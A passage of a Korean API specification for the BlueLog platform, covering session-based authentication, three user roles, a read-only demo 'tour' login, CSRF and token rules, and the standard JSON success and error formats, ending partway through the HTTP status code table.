# API_SPEC — BlueLog

| 항목 | 내용 |
|---|---|
| 문서명 | API_SPEC.md |
| 버전 | v1.42 |
| 상태 | Oracle Review + 외부 리뷰 반영 |
| 최종 수정일 | 2026-09-22 |
| 상위 문서 | `PRD.md` v4.4, `TECH_SPEC.md` v1.7 — `AGENTS §4.4` 「마지막으로 대조를 마친 판본」 |
| 후속 문서 | `DB_SCHEMA.md`, `TEST_PLAN.md` |

---

## 0. 범위 및 목적

본 문서는 PRD §14의 API 요구사항 초안과 TECH_SPEC의 기술 명세를 기반으로 REST API 상세 명세를 정의한다.

### 0.1 설계 원칙

| 원칙 | 설명 |
|---|---|
| RESTful | HTTP method로 리소스 조작 의미 표현. 동사는 URL에 포함하지 않음 (예외: 계산 액션) |
| 버전 관리 | URL prefix `/api/v1/` 사용 |
| 일관된 응답 포맷 | 모든 응답은 동일한 JSON 구조 |
| 오류 코드 표준화 | TECH_SPEC §12 오류 분류에 따른 HTTP status code |
| 면책 고지 | 모든 계산 결과 응답에 `disclaimer` 및 `warnings` 포함 |

### 0.2 기준 문서

| 문서 | 참조 섹션 |
|---|---|
| PRD §14 | API 엔드포인트 초안 |
| TECH_SPEC §2.2.2 | `rng_metadata` 스키마 |
| TECH_SPEC §5.2.1 | `parameters_used` 스키마 |
| TECH_SPEC §10.1 | `model_version` 포맷 |
| TECH_SPEC §11 | 스냅샷 격리 |
| TECH_SPEC §12 | 오류 분류 및 전파 |
| TECH_SPEC §12.3 | Warning 코드 체계 |

---

## 1. 공통 사양

### 1.1 Base URL

```text
https://{host}/api/v1
```

MVP에서는 단일 인스턴스를 가정한다. 향후 멀티테넌트 확장 시 `/api/v1/orgs/{org_id}/` prefix 추가.

### 1.2 인증

MVP는 **자체 이메일·비밀번호 인증 + 서버 세션 쿠키**를 사용한다. 단일 조직을 가정하며, 계정은 **사무직(`OFFICE`)·현장직(`FIELD`)·관리자(`ADMIN`) 세 역할** 중 하나다 (`PRD §5.2` · `§20 O-14` · `#1301`). 데이터 격리는 없다 — 세 역할이 같은 선박·항차를 본다.

> **[#413] 구글 OIDC를 완전히 제거했다.** 종전에는 인증을 구글에 위임했으나(`O-13`), 2026-08-16 결정으로 제품이 이메일과 비밀번호를 직접 관리한다. **세션·CSRF·감사 로그 계층은 그대로다** — 인증 수단과 무관하기 때문이다. 바뀐 것은 「자격을 확인하는 방법」 하나다.

| 항목 | MVP 정책 |
|---|---|
| 인증 방식 | 이메일·비밀번호 → 서버 발급 세션 쿠키 `sid` |
| 비밀번호 저장 | **해시만 저장한다.** 알고리즘은 **Argon2id**다(`PRD §7.10` · `DB_SCHEMA §2.15`). 평문을 로그·감사 기록에 남기지 않는다 |
| 비밀번호 규칙 | **10자 이상 128자 이하.** 대문자·특수문자 같은 복잡도 규칙은 두지 않는다 — 길이만 본다. 상한은 매우 긴 입력이 해싱 비용으로 서비스 거부 수단이 되는 것을 막는다 (`auth/password.py` · 화면 `authRules.ts`가 같은 값) |
| 세션 유효기간 | **발급 후 7일.** 요청이 와도 연장하지 않는다(고정 만료). 로그아웃·비밀번호 변경은 그 전에 무효화한다 (`auth/session.py`) |
| 쿠키 속성 | `HttpOnly` · `Secure` · `SameSite=Lax` · `Path=/` |
| 권한 분리 | **[#1301] 역할 3종 — 사무직(`OFFICE`)·현장직(`FIELD`)·관리자(`ADMIN`).** `app_user.role`(`DB_SCHEMA §2.15`). **현장직은 「넣고 본다」, 사무직은 「정하고 낸다」, 관리자는 사무직 업무 전부 + 계정 관리**(관리자는 사무직의 상위집합) — 아래 「사무직 전용 경로」·「관리자 전용 경로」 두 표에 없는 경로는 세 역할 모두 쓴다. 거부는 `403 FORBIDDEN_ROLE`(`§1.4`) |
| 최초 관리자 | **[#1301] 설정 `INITIAL_ADMIN_EMAILS`(쉼표 목록) — `#672`의 `INITIAL_OFFICE_EMAILS`를 대체한다.** 여기 든 이메일은 **가입할 때와 로그인할 때** 관리자로 맞춘다 — 목록에 있는 동안은 강등해도 다음 로그인에서 되돌아온다(「항상 관리자인 사람」). 새로 가입하는 나머지 계정은 **현장직**으로 시작하고, 관리자가 `PATCH /auth/users/{id}/role`로 올린다. 마이그레이션 044가 **기존 계정은 전부 사무직**으로 채웠고 057은 그 값을 다시 손대지 않는다 — **사람 계정**이 관리자가 되는 경로는 이 목록과 수동 지정 둘뿐이다. 셋째 경로인 **둘러보기 스텁 계정**(아래 「둘러보기」 행 · `#1486`)은 사람 계정이 아니라 코드가 고정해 둔 계정 하나이며, 가입·역할 지정을 거치지 않고 `POST /auth/tour-login`이 `ADMIN`으로 발급한다. **`APP_ENV=production`에서 `INITIAL_ADMIN_EMAILS`가 비면 서버가 기동하지 않는다** — 새 DB에서 관리자 0명이 되지 않게. **옛 이름 `INITIAL_OFFICE_EMAILS`가 설정돼 있으면(비어 있지 않으면) 서버가 기동을 거부한다** — 조용히 무시하면 「적어 뒀는데 아무 일도 없다」가 되어 `#1290`과 같은 실패가 재현된다 |
| 마지막 관리자 | **[#1301] 탈퇴(`DELETE /auth/me`)·강등(`PATCH /auth/users/{id}/role`)을 `409 CONFLICT`로 거절한다.** 관리자가 0명이면 아무도 계정을 관리할 수 없다. 판정은 관리자 행을 잠근 채 한다(동시 강등 방지). **대상 역할이 `OFFICE`든 `FIELD`든 관계없이** 마지막 관리자를 관리자가 아닌 역할로 바꾸는 시도는 전부 걸린다. 문구는 `PRD §6.3` 「마지막 관리자」 |
| 데이터 격리 | 없음. 선박·항차 데이터는 전 사용자가 공유한다 (`PRD §5.2`). **역할은 행위 권한이지 소유권이 아니다** (`PRD §7.10`) |
| 가입 제한 | **[#808] 사내 도구다 — 허용 도메인 또는 초대 코드가 있어야 가입된다.** 설정 `SIGNUP_ALLOWED_DOMAINS`(쉼표 목록) · `SIGNUP_INVITE_CODE` 중 **하나만 맞으면** 된다. 가입 요청 본문의 `invite_code`(선택)가 초대 코드다. 거절은 `422 VALIDATION_ERROR` · `PRD §6.3` 「회원가입 — 가입 제한」 문구 — **어느 조건에서 떨어졌는지 말하지 않는다.** 검사는 비밀번호 해싱 **전에** 한다(거절될 요청에 해싱 비용을 쓰지 않는다). **`APP_ENV=production`에서 두 설정이 모두 비면 서버가 기동하지 않는다** — 개발·테스트에서는 비워 두면 열려 있다 |
| 둘러보기 | **[#1486] 가입·로그인 없이 여는 관리자 열람 세션 — 인터뷰·시연용.** **문과 권한을 나눈다.** 문은 설정 **둘**이 연다 — `TOUR_ACCESS_CODE`(링크 `/login?tour=<코드>`에 코드를 실어야 들어온다) · `TOUR_PUBLIC=true`(코드 없이 로그인 화면의 상시 버튼). **fail-closed — `TOUR_ACCESS_CODE`가 비면 코드 경로는 항상 거절하고, `TOUR_PUBLIC`은 `true`·`1`·`yes`만 참으로 본다(기본 닫힘).** 위 「가입 제한」의 판정(둘 다 비면 열림)과 **반대 방향**이다 — 그 패턴을 쓰면 변수 미설정 배포에서 **누구나 관리자가 된다.** 세션은 고정 스텁 계정(`ADMIN`)으로 발급되며 일반 세션처럼 **7일** 산다 — 두 설정을 모두 비워도 **이미 발급된 세션은 살아 있다**(`user_session` 행이 별개). **권한은 문과 무관하게 항상 읽기 전용이다** — 역할은 `ADMIN`이지만 인증 미들웨어가 쓰기 전체(`POST`·`PATCH`·`PUT`·`DELETE`)와 `GET /auth/users`·`GET /audit-logs`·자기 탈퇴를 **403**으로 막는다(`auth/tour_policy.py` · `docs/OPERATIONS.md §3.7`). 역할을 늘리는 것이 아니라 **세션 정책 한 겹**이라 `PRD §5.2`의 역할 3종 제한과 부딪히지 않는다. 거절은 `422 VALIDATION_ERROR` · `PRD §6.3` 「둘러보기 — 거절」 문구 — **꺼져 있음과 불일치를 말하지 않는다**(가입 제한과 같은 원칙) |
| 미인증 응답 | `401 UNAUTHORIZED` |
| CSRF | 상태 변경 요청(POST·PATCH·DELETE)에 `X-CSRF-Token` 헤더 요구. **세션을 요구하는 라우트에 예외를 두지 않는다** (`#634`) |
| 이메일 인증 | 가입 시 확인 메일 발송. **미인증 상태에서도 로그인은 허용**한다 (`PRD §7.10`) |
| 하지 않는 것 | 사용자별 데이터 격리 · 역할을 3종보다 더 세분화하는 것 · 화면별 세부 권한. **필요해지면 `PRD §5.2`를 먼저 개정한다** — 「향후 확장」으로 두지 않는다(10/10 뒤 개발 없음) |

**인증 예외 경로** — 다음은 세션 없이 접근할 수 있다.

| 경로 | 사유 |
|---|---|
| `GET /health` | 헬스 체크 |
| `POST /auth/signup` · `POST /auth/login` | 인증 플로우 자체 |
| `POST /auth/tour-login` | 인증 플로우 자체 — 링크에 실린 코드가 자격 증명이며, 공개 스위치(`TOUR_PUBLIC`)가 켜지면 코드 없이 연다 (`#1486`). **환경과 무관하게 항상 등록**되므로 `dev-login`과 달리 공개 경로 목록의 **기본 집합**(`auth/dependencies.py` `_BASE_PUBLIC_PATHS`)에 든다 |
| `POST /auth/verify-email/*` · `POST /auth/password-reset/*` | 메일 링크로 진입하므로 세션이 없다 |

> **위 표는 `/api/v1` prefix를 생략한 축약 표기다 (`#648`).** 실제 경로는 `§12` 라우트 표가 정한다 — `GET /api/v1/health`·`POST /api/v1/auth/login`처럼 **전부 prefix를 단다.** 구현의 공개 경로 목록(`auth/dependencies.py`)이 이 표기를 문자 그대로 옮겨 **prefix 없는 사본 8개**를 함께 들고 있었는데, 실제 요청이 그런 경로로 오지 않아 **영원히 매치되지 않는 항목**이었다. 지금은 제거했고, 목록의 모든 경로에 라우트가 실재하는지를 `tests/test_docs_exposure.py`가 검사한다.

그 밖의 모든 `/api/v1/*` 경로는 유효한 세션을 요구한다.

**사무직 전용 경로** — `require_office`(`auth/dependencies.py`)가 걸린 라우트. 현장직은 `403 FORBIDDEN_ROLE`이다. **이 표가 목록의 주인이고 `tests/test_roles_db.py`가 소스와 대조한다** — 한쪽만 바뀌면 CI가 실패한다.

| 경로 | 화면 | 왜 사무직인가 |
|---|---|---|
| `POST /vessels` | 1-2 선박 등록 | 선박 제원은 기준값이다 |
| `PATCH /vessels/{vessel_id}` | SCR-002 선박 관리 · 2-8 선박 상세 | 〃. **위치·운항 상태(`PATCH /vessels/{id}/position`)는 현황 입력이라 두 역할 모두** |
| `DELETE /vessels/{vessel_id}` | SCR-002 선박 관리 | 〃 |
| `POST /annual-simulations` | 2-3 연간 등급 관리 | 시뮬레이션 실행은 계획 업무. 결과 조회(`GET`)는 두 역할 모두 |
| `POST /annual-simulations/{simulation_run_id}/reproduce` | 2-3 연간 등급 관리 | 〃 |
| `POST /scenarios/{scenario_id}/adopt` | 2-2 항로 비교 | 채택은 계획 확정 행위. 비교(`compare`)는 두 역할 모두 |
| `GET /voyages/{voyage_id}/report` | 2-5 보고서 | 대외 산출물 |
| `GET /vessels/{vessel_id}/annual-report` | 2-5 보고서 | 〃 |
| `POST /fleet/reduction-plans/evaluate` | 2-10 함대 감축 계획 | 선대 단위 경영 판단 — 화면 전체가 사무직 |
| `POST /parameters/import` | SCR-006 파라미터 관리 | **등급 판정 기준 자체를 바꾼다** (`§7.5` · #673). 조회(`GET §7.1~§7.4`)는 두 역할 모두 |
| `POST /fleet/reduction-plans` | 2-10 함대 감축 계획 | 〃 |
| `GET /fleet/reduction-plans` | 2-10 함대 감축 계획 | 〃 |
| `GET /fleet/reduction-plans/{plan_id}` | 2-10 함대 감축 계획 | 〃 |
| `GET /audit-logs` | SCR-006 파라미터 관리 (`#1239`) | **사용자 식별자와 IP가 들어 있다** — 현장직에게는 자기 작업과 무관한 남의 활동 기록이다. `PRD §7.10`이 규정 파라미터 관리를 사무직 몫으로 두었으므로 그 이력도 같은 자리에서 본다 (`§16.1` · #1241) |

**관리자 전용 경로** — `require_admin`(`auth/dependencies.py`)이 걸린 라우트. 현장직·**사무직도** `403 FORBIDDEN_ROLE`이다(`require_office`가 관리자를 통과시키는 것과 반대 방향 — 이 표의 경로는 사무직도 막는다). `#1301`로 사무직 전용에서 옮겨왔다. **이 표가 목록의 주인이고 `tests/test_roles_db.py`가 소스와 대조한다** — 한쪽만 바뀌면 CI가 실패한다.

| 경로 | 화면 | 왜 관리자인가 |
|---|---|---|
| `GET /auth/users` | 2-6 설정 | 계정 목록은 역할 지정의 재료 — **계정 관리는 관리자 전용**(`#1301`. 종전 사무직 전용이었다 — `#672`) |
| `PATCH /auth/users/{user_id}/role` | 2-6 설정 | 역할 지정 — 사무직끼리 서로를 강등할 수 있던 경로를 관리자로 좁혔다(`#1301`) |

> **세 역할 모두 쓰는 것** — 항차 등록·수정·실적·전환·CSV 가져오기(`§3`) · 정박 구간(`§4`) · 기능① 계산·기능② 비교(`§2`·`§5`) · 위치 갱신 · 운항 기록 CSV 내보내기(`§8.1` — 산출물이 아니라 **자기가 넣은 기록**이다) · 대시보드·데이터 점검 조회 · 파라미터 **조회**(선택지 목록의 재료) · 챗봇(`§15`) · 자기 계정 관리. 규정 파라미터 **개정 적재**(`§7.5` · `#673`)는 구현 시 사무직 전용이다(관리자도 통과).

> 파라미터 변경(POST/PATCH `/parameters/*`) 및 항차 확정(CONFIRMED 전환)은 감사 로그에 기록된다 (`TECH_SPEC §13.1`). **`audit_log.user_id`에 `app_user.id`를 기록한다.**

**인증 엔드포인트**

| Method | Path | 인증 | 설명 |
|---|---|---|---|
| `POST` | `/auth/signup` | 불필요 | 이메일·비밀번호(+ 선택 `invite_code`) 가입 → **가입 제한 확인**(위 표) → 인증 메일 발송 → 세션 발급 |
| `POST` | `/auth/login` | 불필요 | 이메일·비밀번호 검증 → 세션 발급 |
| `POST` | `/auth/tour-login` | 불필요 | **둘러보기** (`#1486`) — 본문 `{"code": "<링크에 실린 코드>"}`를 설정 `TOUR_ACCESS_CODE`와 상수 시간 비교(`hmac.compare_digest` · 초대 코드와 같은 패턴). **`TOUR_PUBLIC=true`면 빈 코드로도 통과한다** — 코드는 선택 필드이며 길이 하한이 없다(`#1507`). 통과하면 고정 스텁 계정(**관리자 `ADMIN`** · 고정 UUID·고정 이메일 · Argon2 형식이 아닌 해시라 `POST /auth/login`으로는 열리지 않는다)으로 세션 발급 — **그 세션은 읽기 전용**이다(위 「둘러보기」 행). **성공 응답은 `POST /auth/login`과 같은 형태**(200 · `data` 사용자 객체 · `sid`·`csrf` 쿠키). 거절은 **`422 VALIDATION_ERROR` 한 가지** — 코드 미설정(fail-closed)과 불일치를 **가르지 않는다**, 문구는 `PRD §6.3` 「둘러보기 — 거절」. 요청 한도는 인증 API 버킷(`§13.2` 분당 10회) |
| `POST` | `/auth/logout` | **필요** | 세션 즉시 무효화 + 쿠키 만료 → 204. **세션이 없으면 401**이다 (`#634`) |
| `GET` | `/auth/me` | **필요** | 현재 사용자 정보 (`id` · `email` · `display_name` · **`role`** · `email_verified_at` · `last_login_at`) |
| `POST` | `/auth/verify-email/request` | 불필요 | 인증 메일 재발송 |
| `POST` | `/auth/verify-email/confirm` | 불필요 | 토큰 검증 → `email_verified_at` 기록 |
| `POST` | `/auth/password-reset/request` | 불필요 | 재설정 메일 발송 |
| `POST` | `/auth/password-reset/confirm` | 불필요 | 토큰 검증 → 비밀번호 교체 + **해당 사용자의 기존 세션 전량 무효화** |
| `POST` | `/auth/password-change` | **필요** | 현재 비밀번호 검증 → 교체 + **기존 세션 전량 무효화** (로그인 상태에서의 변경) |
| `PATCH` | `/auth/me` | **필요** | 표시 이름(`display_name`) 변경. **`email`은 받지 않는다** |
| `DELETE` | `/auth/me` | **필요** | 탈퇴 — `is_deleted` soft delete + 세션 전량 무효화. **계산·감사 기록은 보존.** 마지막 관리자면 `409 CONFLICT` (`#1301` — 종전 마지막 사무직 `#672`) |
| `GET` | `/auth/users` | **관리자** | 살아 있는 계정 전부 — `/auth/me`와 같은 사용자 객체의 배열, 이메일 순 (`#1301` — 종전 사무직 전용이었다 `#672`) |
| `PATCH` | `/auth/users/{user_id}/role` | **관리자** | 본문 `{"role": "OFFICE" \| "FIELD" \| "ADMIN"}`. 같은 값이면 쓰지 않는다. 마지막 관리자 강등은 `409 CONFLICT`. 감사 로그 `ROLE_CHANGE`(행위자 `user_id` · 대상 `entity_id`) (`#1301`) |

> **⚠️ 계정 존재 여부를 노출하지 않는다.** `POST /auth/login` 실패는 **가입 여부와 무관하게 같은 응답·같은 소요시간**을 반환한다 — 없는 계정에도 가짜 해시로 비밀번호 검증을 한 번 수행해 시간을 쓴다(`verify_dummy_async`). `POST /auth/password-reset/request`와 `POST /auth/verify-email/request`는 **같은 응답**만 보증하고 **소요시간은 보증하지 않는다.** 「없는 이메일입니다」를 내면 **가입자 목록을 캐낼 수 있다.** 문구는 `PRD §6.3`이 확정한다.
>
> **[#1405] 요청 2경로의 소요시간을 보증에서 뺐다.** 종전 이 문장은 `password-reset/request`에도 「같은 소요시간」을 적었으나 **코드에 균등화가 없었다** — 계정이 없으면 곧바로 200을 내고, 있으면 토큰 발급·커밋·SMTP 발송을 거친다(`auth_tokens.py` `request_password_reset`). `verify-email/request`도 같다. 시간을 맞추려면 발송을 응답 뒤로 미뤄야 하는데, 그러면 **`#1326`이 세운 「메일이 안 가면 500으로 알린다」가 사라진다** — 메일이 안 왔을 때 사용자가 다시 누를 근거다. 응답 시간 바닥값을 넣는 안은 근거 있는 값이 없고 SMTP 분산이 바닥을 넘으면 신호가 다시 남는다. 타이밍 차가 드러내는 것은 「가입돼 있다」의 부분집합인데 **그 사실은 `POST /auth/signup`이 중복 이메일에 내는 409가 이미 알린다**(`PRD §6.3` 비대칭 규정 · `auth.py` `signup`). 두 경로의 시간 차는 인증 경로 분당 한도(`RATE_LIMIT_AUTH_PER_MINUTE` 기본 10 · `§13.2`)로 갈음한다. 로그인의 균등화는 `test_auth_api.py`가 잠근다.
>
> **[#1326] 토큰 경로의 상태 코드는 `§1.4` 표를 따른다.** 종전에는 `auth_tokens.py`가 상태를 직접 적어 **`VALIDATION_ERROR`에 400**(`§1.4`는 422), **메일 발송 실패에 502**(`§1.4`에 502 행이 없고 `INTERNAL_ERROR`는 500)를 냈다 — 같은 코드에 다른 상태가 붙는 자리가 그 파일 하나뿐이었다. 상태를 인자로 받던 것을 없애 **코드가 정해지면 상태도 정해지게** 했다(`errors.ERROR_HTTP_STATUS`).
>
> **인증 메일 재발송(`/auth/verify-email/request`)의 소요시간이 같지 않은 것은 위 `[#1405]` 정리에 따른 것이다.** `#1326`에서 분리해 `#1405`가 보증 범위를 좁히는 쪽으로 닫았다.
>
> **[#902] 자격 증명 오류는 `UNAUTHORIZED`가 아니라 `INVALID_CREDENTIALS`다.** `§1.4`가 `UNAUTHORIZED`를 「세션 없음·만료·무효」로 정의하는데, 종전에는 로그인 실패와 비밀번호 변경의 현재 비밀번호 오입력도 그 코드를 써서 **봉투가 세션 만료와 같았다** — 클라이언트는 문구를 대조하거나 세션을 한 번 더 조회해 두 사유를 갈라야 했다(`#878`). 상태는 둘 다 401로 두고 코드만 가른다. 로그인 실패는 없는 이메일과 틀린 비밀번호가 **같은 코드·같은 문구**라 위 「계정 존재 여부를 노출하지 않는다」와 충돌하지 않는다.
>
> **⚠️ 비밀번호 재설정 성공 시 기존 세션을 전부 무효화한다.** 탈취된 상태에서 비밀번호만 바꾸면 **공격자 세션이 그대로 살아 있다.**
>
> **토큰 규칙 (#408 구현 완료).** 발급 시 만든 원문은 **메일 본문에만** 실리고 DB에는 SHA-256 해시만 남는다(`user_session`과 같은 규칙). 유효기간은 **이메일 인증 24시간 · 비밀번호 재설정 1시간**이며, 재설정이 짧은 것은 그 토큰이 **계정을 통째로 넘기는 힘**을 갖기 때문이다. 재발송하면 같은 용도의 이전 토큰은 함께 무효화된다 — 유효한 링크가 쌓이면 오래된 메일이 계속 살아 있다.
>
> **⚠️ 이메일 변경 엔드포인트를 두지 않는다 (#506).** `PATCH /auth/me`는 `display_name`만 받으며 `email`을 보내면 `extra="forbid"`가 **422로 거부**한다. 이메일은 로그인 ID이자 `idx_app_user_email`의 키이고, 새 주소를 잘못 입력하면 **계정에 접근할 수 없다**(재설정 메일도 그 주소로 간다). 주소를 바꾸려면 탈퇴 후 재가입한다 — 그 인덱스가 `WHERE is_deleted = false`인 부분 인덱스라 성립한다. 근거와 고지 문구는 `PRD §6.3`.
>
> **⚠️ 비밀번호 변경도 세션을 전부 무효화한다.** 재설정과 같은 이유다 — 탈취된 상태에서 비밀번호만 바꾸면 공격자 세션이 살아 있다. **변경을 요청한 본인도 로그아웃된다.** 응답 문구가 무효화된 기기 수를 알린다(`PRD §6.3`).
>
> **⚠️ 로그아웃은 「세션 없어도 204」가 아니다 (#634).** 종전에는 이 표가 *「멱등 (세션 없어도 204)」*로 적었으나 **같은 행의 「인증: 필요」와 모순**이었고, 그 문구는 `#272`(PR `#297`)에서 사유 없이 들어온 것이다. 구현·테스트는 처음부터 보호 경로로 다뤄 왔다 — 세션이 없으면 `auth_middleware`가 라우트 앞에서 `401`로 끊는다. 로그아웃을 공개 경로로 두는 대안은 **인증 예외 경로 표의 두 사유(「인증 플로우 자체」·「메일 링크로 진입」) 어디에도 해당하지 않고**, 제3자 사이트가 사용자를 강제 로그아웃시킬 수 있게 된다.
>
> **⚠️ CSRF 검증에 예외를 두지 않는다 (#634).** `#634` 당시 상태 변경 라우트 31개 중 `require_csrf`가 없던 8개 가운데 일곱은 **세션이 없는 공개 인증 경로**였고(가입·로그인·dev-login·메일 링크 4종) — 검증할 세션이 없으므로 예외가 아니라 적용 대상이 아닌 것이다 — `POST /auth/logout`만 **세션을 요구하면서 검증이 없었다.** 데이터가 바뀌지 않아 심각도는 낮지만 규칙의 예외에 사유가 없었으므로 예외를 없앴다.
>
> **[#1486] 현재는 38개 중 8개**이며 여덟은 **전부 공개 인증 경로**다(가입·로그인·dev-login·**둘러보기**·메일 링크 4종). 수치는 `tests/test_auth_wiring.py`의 `_mutating_routes()`로 센 것이고, 같은 검사가 **세션을 요구하는 라우트에 검증이 빠지지 않았는지**를 CI에서 본다 — 그래서 이 숫자가 낡아도 규칙은 지켜진다.
>
> **⚠️ 탈퇴는 행을 지우지 않는다.** `app_user.is_deleted`를 세우는 soft delete이며, `calculation_run`(immutable · `DB_SCHEMA §7.3`)과 `audit_log`(보존 · `§7.1`)에 남은 기록은 그대로다. `audit_log.user_id`는 FK가 아닌 문자열이라 **참조가 깨지지는 않으나 가리키는 계정이 탈퇴 상태가 된다.**

> **토큰 실패는 사유를 구분하지 않는다.** 「없음」·「만료」·「이미 사용됨」이 모두 같은 응답이다 — 구분하면 공격자가 토큰 추측 결과를 좁힐 수 있다. 문구는 `PRD §6.3`이 확정한다.
>
> 개발 환경(`APP_ENV`가 `development`·`test`)에서만 `POST /auth/dev-login` 스텁 경로를 추가한다 — 고정 테스트 사용자로 세션 발급. **`staging`·`production`에서는 라우트 자체를 등록하지 않는다.** 조건을 「`!= production`」이 아니라 **여는 목록**으로 적는 이유는 `#1058`이다 — 부정형은 새 환경이 늘 때 **여는 쪽으로** 틀리고, 실제로 `staging` 배포에서 이 경로가 열린 채 공개됐다.
>
> **[#1486] 둘러보기(`POST /auth/tour-login`)는 그 반대다 — 환경과 무관하게 항상 등록되되, 코드로 잠긴다.** `dev-login`이 「여는 환경이면 누구나」라면 둘러보기는 「어느 환경이든 코드를 아는 사람만」이다. 배포본은 `APP_ENV=staging`이라 `dev-login`이 등록되지 않는데, `_DEV_SURFACE_ENVS`에 `staging`을 더하는 대안은 그 상수에 `/docs`·시연 계정 시드가 **함께 묶여 있어**(`#1058`) 택하지 않았다. 문은 등록 여부가 아니라 **`TOUR_ACCESS_CODE`**(와 공개 스위치 `TOUR_PUBLIC`)이며, 둘 다 비면 **항상 거절**한다(fail-closed) — 그래서 `#1058`이 닫은 것을 다시 열지 않는다. **문을 넓혀도 권한은 넓어지지 않는다** — 둘러보기 세션은 어느 경로로 들어오든 읽기 전용이다.

### 1.3 공통 응답 포맷

> **응답 필드 집합을 테스트가 잠근다 (`#559`).** 라우트 46개가 `dict[str, object]`를 돌려주므로 FastAPI가 응답 스키마를 만들지 못하고, **응답이 조용히 바뀌어도 아무것도 잡지 않았다.** `tests/test_response_contract_db.py`가 화면이 쓰는 엔드포인트 16종의 **필드 집합을 중첩까지** 대조한다 — 필드가 빠지거나 이름이 바뀌면 CI가 실패한다.
>
> **[#753] 모든 라우트가 대상이다.** 종전 계약 표는 조회 위주 16종이라 계산·쓰기 엔드포인트의 절반이 빠져 있었고, 그 자리에서 `#751`·`#752`가 실제로 깨졌다. 지금은 계약 표에 없는 라우트가 **그 필드 집합을 보는 테스트를 가리키거나 면제 사유를 적어야** 하며, 둘 다 없으면 CI가 실패한다(`test_every_route_has_a_contract_or_a_reason`). 쓰기 응답은 새 계약을 쓰지 않고 **같은 자원의 조회 계약과 대조**한다 — 화면이 저장 응답을 그대로 목록에 끼워 넣기 때문이다. 파일 응답(리포트·내보내기)은 필드 집합이 없어 **형식·첨부 헤더와 내보내기 헤더 행**(`§8.1` 열 목록과 대조)을 계약으로 본다.
>
> **값이 아니라 키를 본다.** 이 결함의 실제 모습은 이름이 바뀌거나 필드가 빠지는 것이고, 그때 화면에는 오류가 아니라 `undefined`가 뜬다. 값까지 맞추는 안(이 문서의 응답 예시 30곳과 대조)은 유지비가, 응답 모델(`response_model`) 도입안은 `§1.7`(Layer-1은 문자열)과의 양립 검토가 각각 선행한다.
>
> **필드를 더해도 실패한다.** 응답 계약이 넓어지는 것은 화면이 타입을 고쳐야 한다는 뜻이고, 그 변화가 리뷰에 보여야 한다.

#### 1.3.1 성공 응답

```json
{
  "data": { ... },
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z"
  }
}
```

계산 결과를 포함하는 응답은 추가 필드:

```json
{
  "data": { ... },
  "parameters_used": { ... },
  "calculation_run_id": "uuid",
  "model_version": { ... },
  "input_hash": "sha256:...",
  "parameter_hash": "sha256:...",
  "warnings": ["REFERENCE_ONLY"],
  "disclaimer": "참고용 예측값입니다. 규제 제출용 공식 결과가 아닙니다.",
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z",
    "duration_ms": 142
  }
}
```

#### 1.3.2 오류 응답

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "운항 거리는 0보다 커야 합니다.",
    "details": [
      {
        "field": "distance_nm",
        "field_label": "운항 거리",
        "rule": "VAL-002",
        "message": "운항 거리는 0보다 커야 합니다."
      }
    ]
  },
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z"
  }
}
```

> **`message` 언어 규정**: `error.message`·`details[].message`는 `field_label`과 동일하게 **한국어**로 작성한다 (§1.4의 프레임워크 발생 오류 포함). 프레임워크(Starlette/FastAPI) 기본 영문 문구(`'Not Found'`, `'Method Not Allowed'`)를 그대로 내보내지 않는다.
>
> **[#900] Pydantic 검증 실패(422)도 이 규정을 따른다.** 종전에는 Pydantic 원문(`String should have at most 100 characters`)이 `message`로, 필드명 원문(`display_name`)이 `field_label`로 나갔다 — 라벨 표가 기능① 요청 필드와 목록 쿼리 17항목뿐이었다. 이제 서버가 **오류의 `type`·한계값에서 한국어 문장을 새로 만든다**(원문을 번역하지 않는다 — 원문은 Pydantic 판마다 바뀌지만 `type`은 공개 계약이다). 문장 틀은 §11 VAL-001 「`{field_label}`을/를 입력하세요.」 · VAL-002 「`{field_label}`는 0보다 커야 합니다.」를 따르고, 조사는 라벨의 받침으로 고른다. 직접 만든 검증기의 한국어 문구는 그대로 쓰며, **모르는 `type`은 「`{field_label}` 값이 올바르지 않습니다.」**로 떨어진다. 본문이 JSON이 아니면 `field`는 빈 문자열, `field_label`은 「요청 본문」이다. **모든 엔드포인트의 요청 필드가 한글 라벨을 가진다** — 라벨은 화면의 입력칸 이름을 따르며, 새 필드가 라벨 없이 들어오면 검사가 실패한다(`src/cii_platform/api/field_labels.py` · `validation_messages.py`).
>
> **[#999] 서비스가 직접 던지는 문구도 같다.** 필드명 원문(`regulation_year` 등)을 문장에 쓰지 않고 라벨로 부르며, **계산 엔진의 영문 예외를 문구 뒤에 붙이지 않는다** — 종전에는 DWT가 빈 선박이 「선박 제원이 부족해 계산할 수 없습니다: deadweight is required for ship_type 'BULK_CARRIER' … but was None」을 받았다. 사용자가 고칠 수 있는 원인(선종의 용량 축 DWT·GT가 비었거나 0 이하)은 **무엇이 비었는지** 한국어로 말하고, 고칠 수 없는 원인(기준선 구간의 빈틈 · 결과 NaN)은 정본 문구(§11 VAL-005 · VAL-008)만 두고 진단은 서버 로그로 보낸다 — 응답의 `request_id`로 찾는다. **용량 축이 비어 기준선·등급 경계를 고르지 못한 경우는 409가 아니라 422 `VALIDATION_ERROR`(`field: vessel_id`)다** — 종전에는 규정 파라미터 오류(409)로 나가 사용자가 제원을 채우면 풀리는 일을 서버 문제로 보이게 했다. 검사가 서비스의 `raise` 문을 읽어 같은 결함이 다시 들어오지 않게 한다(`tests/test_error_message_language.py`).

### 1.4 HTTP Status Code 매핑

> TECH_SPEC §12.1 오류 분류에 따른 매핑.

| HTTP Status | Error Code | 발생 조건 |
|---|---|---|
| 200 OK | — | 성공 (warning 포함 가능). 기상 API 실패 시 NONE fallback으로 계산, `warnings`에 `WEATHER_NONE_FALLBACK` 포함 |
| 201 Created | — | 리소스 생성 성공 |
| 400 Bad Request | `BAD_REQUEST` | **프레임워크가 낸 400**을 `§1.3.2` 포맷으로 변환한 것 (`#183`). **우리 코드가 직접 내는 자리는 없다** — JSON 파싱 오류·잘못된 Content-Type은 아래 **422**다 (`#1366` 실측) |
| 401 Unauthorized | `UNAUTHORIZED` | 세션 없음, 세션 만료, 세션 무효 |
